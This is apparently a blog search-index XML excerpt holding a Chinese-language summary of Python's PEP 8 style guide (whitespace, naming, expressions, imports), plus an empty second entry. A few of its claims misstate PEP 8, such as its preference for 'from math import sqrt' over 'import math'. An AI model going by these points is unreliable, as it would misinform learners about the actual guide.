    <url>%2F2015%2F03%2F03%2FPEP%208%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[PEP8简介PEP是Python Enhancement Proposal的缩写，通常翻译为“Python增强提案”。每个PEP都是一份为Python社区提供的指导Python往更好的方向发展的技术文档，其中的第8号增强提案（PEP 8）是针对Python语言编订的代码风格指南。尽管我们可以在保证语法没有问题的前提下随意书写Python代码，但是在实际开发中，采用一致的风格书写出可读性强的代码是每个专业的程序员应该做到的事情，也是每个公司的编程规范中会提出的要求，这些在多人协作开发一个项目（团队开发）的时候显得尤为重要。我们可以从Python官方网站的PEP 8链接中找到该文档，下面我们对该文档的关键部分做一个简单的总结。 空格的使用 使用空格来表示缩进而不要用制表符（Tab）。这一点对习惯了其他编程语言的人来说简直觉得不可理喻，因为绝大多数的程序员都会用Tab来表示缩进，但是要知道Python并没有像C/C++或Java那样的用花括号来构造一个代码块的语法，在Python中分支和循环结构都使用缩进来表示哪些代码属于同一个级别，鉴于此Python代码对缩进以及缩进宽度的依赖比其他很多语言都强得多。在不同的编辑器中，Tab的宽度可能是2、4或8个字符，甚至是其他更离谱的值，用Tab来表示缩进对Python代码来说可能是一场灾难。 和语法相关的每一层缩进都用4个空格来表示。 每行的字符数不要超过79个字符，如果表达式因太长而占据了多行，除了首行之外的其余各行都应该在正常的缩进宽度上再加上4个空格。 函数和类的定义，代码前后都要用两个空行进行分隔。 在同一个类中，各个方法之间应该用一个空行进行分隔。 二元运算符的左右两侧应该保留一个空格，而且只要一个空格就好。 标识符命名PEP 8倡导用不同的命名风格来命名Python中不同的标识符，以便在阅读代码时能够通过标识符的名称来确定该标识符在Python中扮演了怎样的角色（在这一点上，Python自己的内置模块以及某些第三方模块都做得并不是很好）。 变量、函数和属性应该使用小写字母来拼写，如果有多个单词就使用下划线进行连接。 类中受保护的实例属性，应该以一个下划线开头。 类中私有的实例属性，应该以两个下划线开头。 类和异常的命名，应该每个单词首字母大写。 模块级别的常量，应该采用全大写字母，如果有多个单词就用下划线进行连接。 类的实例方法，应该把第一个参数命名为self以表示对象自身。 类的类方法，应该把第一个参数命名为cls以表示该类自身。 表达式和语句在Python之禅（可以使用import this查看）中有这么一句名言：“There should be one– and preferably only one –obvious way to do it.”，翻译成中文是“做一件事应该有而且最好只有一种确切的做法”，这句话传达的思想在PEP 8中也是无处不在的。 采用内联形式的否定词，而不要把否定词放在整个表达式的前面。例如if a is not b就比if not a is b更容易让人理解。 不要用检查长度的方式来判断字符串、列表等是否为None或者没有元素，应该用if not x这样的写法来检查它。 就算if分支、for循环、except异常捕获等中只有一行代码，也不要将代码和if、for、except等写在一起，分开写才会让代码更清晰。 import语句总是放在文件开头的地方。 引入模块的时候，from math import sqrt比import math更好。 如果有多个import语句，应该将其分为三部分，从上到下分别是Python标准模块、第三方模块和自定义模块，每个部分内部应该按照模块名称的字母表顺序来排列。 注: 本文采集于网上,关注更多python开发知识可关注CSDN 博客 骆昊老师专栏https://me.csdn.net/jackfrued]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>PEP 8风格指南</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2015%2F01%2F06%2F%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3%20-%20%E5%89%AF%E6%9C%AC%20-%20%E5%89%AF%E6%9C%AC%2F</url>
    <content type="text"></content>
  </entry>
</search>
